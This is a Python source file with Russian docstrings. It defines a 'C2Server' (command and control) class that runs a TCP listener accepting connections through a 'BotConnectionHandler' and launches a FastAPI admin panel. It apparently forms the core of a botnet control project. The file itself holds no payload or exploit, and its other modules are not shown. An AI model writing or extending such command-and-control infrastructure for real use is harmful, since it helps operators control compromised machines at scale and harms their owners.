# backend/Core/Server.py

import asyncio
import webbrowser
from typing import List, NoReturn, Optional

from backend.Config import STORAGE_DIR, IP, PORT, API_PORT
import backend.LoggerWrapper as logger

logger.Log.setup(str(STORAGE_DIR / "server.log"))

from backend import start_benchmark
from ..API.api import run_fastapi_server
from .ClientConnection import BotConnectionHandler


class C2Server:
    """
    Класс управления центральным сервером (Command and Control).
    
    Схема сетевого взаимодействия:
    [TCP Packet] -> BotConnectionHandler -> Обработка команд.
    [HTTP Request] -> FastAPI -> Панель управления.
    """

    def __init__(self) -> None:
        """Инициализация экземпляра сервера без запуска сетевых служб."""
        self.server: Optional[asyncio.AbstractServer] = None

    async def start(self) -> None:
        """
        Запускает TCP сервер, API сервер и систему мониторинга.
        
        Последовательность запуска:
        1. Регистрация обработчика соединений BotConnectionHandler.
        2. Инициализация TCP Server на порту PORT.
        3. Запуск FastAPI для веб-интерфейса.
        4. Открытие браузера с панелью управления.
        """
        connection_handler: BotConnectionHandler = BotConnectionHandler()

        self.server = await asyncio.start_server(
            connection_handler.handle_new_connection,
            IP,
            PORT,
            reuse_address=True,
            backlog=1000,
            limit=5242880
        )

        logger.Log.info(f"[{self.__class__.__name__}] TCP Server started on {IP}:{PORT}")

        api_tasks: List[asyncio.Task] = [
            asyncio.create_task(run_fastapi_server(IP, API_PORT))
        ]

        start_benchmark(asyncio.get_running_loop())

        admin_panel_url: str = f"http://127.0.0.1:{API_PORT}/"

        logger.Log.info(f"[{self.__class__.__name__}] API Server launching at {admin_panel_url}")

        await asyncio.sleep(1)
        webbrowser.open(admin_panel_url)

        async with self.server:
            try:
                await asyncio.gather(self.server.serve_forever(), *api_tasks)
            except asyncio.CancelledError:
                logger.Log.warning(f"[{self.__class__.__name__}] Shutdown initiated...")
            finally:
                for task in api_tasks:
                    task.cancel()
                await asyncio.gather(*api_tasks, return_exceptions=True)
                logger.Log.info(f"[{self.__class__.__name__}] Server stopped.")

async def start_server() -> None:
    """
    Точка входа для запуска сервера.
    Создает экземпляр C2Server и переводит его в состояние ожидания соединений.
    """
    server_instance: C2Server = C2Server()
    await server_instance.start()